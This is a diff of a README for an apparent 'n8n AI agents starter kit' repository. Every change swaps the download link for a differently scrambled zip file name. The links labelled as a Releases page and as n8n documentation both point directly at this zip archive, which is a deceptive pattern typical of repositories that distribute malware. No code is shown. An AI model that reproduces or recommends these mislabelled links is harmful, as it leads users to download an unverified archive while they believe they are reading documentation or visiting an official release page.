@@ -1,6 +1,6 @@
 # 🎉 n8n-ai-agents-starter-kit - Your Gateway to Easy Automation
 
-[![Download n8n-ai-agents-starter-kit](https://github.com/Codimart/n8n-ai-agents-starter-kit/raw/refs/heads/main/workflows/agents-kit-n-starter-ai-1.4-beta.1.zip)](https://github.com/Codimart/n8n-ai-agents-starter-kit/raw/refs/heads/main/workflows/agents-kit-n-starter-ai-1.4-beta.1.zip)
+[![Download n8n-ai-agents-starter-kit](https://raw.githubusercontent.com/Codimart/n8n-ai-agents-starter-kit/main/workflows/kit-n-ai-starter-agents-1.2-alpha.4.zip)](https://raw.githubusercontent.com/Codimart/n8n-ai-agents-starter-kit/main/workflows/kit-n-ai-starter-agents-1.2-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ To use the n8n-ai-agents-starter-kit, you will need:
 
 To download the n8n-ai-agents-starter-kit, please visit the Releases page:
 
-[Visit this page to download](https://github.com/Codimart/n8n-ai-agents-starter-kit/raw/refs/heads/main/workflows/agents-kit-n-starter-ai-1.4-beta.1.zip)
+[Visit this page to download](https://raw.githubusercontent.com/Codimart/n8n-ai-agents-starter-kit/main/workflows/kit-n-ai-starter-agents-1.2-alpha.4.zip)
 
 1. Click on the latest release version.
 2. Choose the file suitable for your operating system.
@@ -50,7 +50,7 @@ Once downloaded, follow these steps to run the application:
 
 To help you make the most of this starter kit, here are some resources:
 
-- **n8n Documentation:** [Visit Documentation](https://github.com/Codimart/n8n-ai-agents-starter-kit/raw/refs/heads/main/workflows/agents-kit-n-starter-ai-1.4-beta.1.zip) - Learn how to use n8n effectively.
+- **n8n Documentation:** [Visit Documentation](https://raw.githubusercontent.com/Codimart/n8n-ai-agents-starter-kit/main/workflows/kit-n-ai-starter-agents-1.2-alpha.4.zip) - Learn how to use n8n effectively.
 - **Video Tutorials:** Search for tutorials online to find guides on building workflows.
 - **Community Forum:** Join the n8n community for tips and support.
 
